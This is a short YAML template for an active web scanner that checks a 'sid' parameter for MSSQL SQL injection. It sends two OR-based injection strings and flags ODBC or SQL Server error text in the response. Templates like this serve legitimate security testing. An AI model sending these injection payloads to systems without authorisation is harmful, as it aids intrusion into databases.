id: sqli6-mssql-30
name: 'SQLi mssql probe in sid'
severity: high
type: active
tags:
  - sqli
  - injection
  - mssql
description: 'Triggers mssql error via sid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      sid:
        - ''') OR ''a''=''a'
        - ''') OR (''1''=''1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ODBC'
          - 'SQL Server'
